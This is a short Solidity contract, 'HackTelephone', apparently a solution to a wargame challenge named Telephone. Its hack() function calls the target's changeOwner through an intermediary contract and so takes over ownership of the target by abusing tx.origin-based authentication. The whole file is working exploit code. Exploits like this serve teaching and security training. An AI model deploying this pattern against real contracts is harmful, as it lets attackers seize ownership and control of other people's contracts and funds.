// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "@openzeppelin/contracts/access/Ownable.sol";
import "./Telephone.sol";


contract HackTelephone is Ownable {
    
    Telephone telephone;
    
    constructor(address telephoneAddress) public Ownable() {
        telephone = Telephone(telephoneAddress);
    }

    function updateTelephone(address telephoneAddress) public onlyOwner {
        telephone = Telephone(telephoneAddress);
    }

    function hack() public onlyOwner {
        telephone.changeOwner(msg.sender);
    }

}
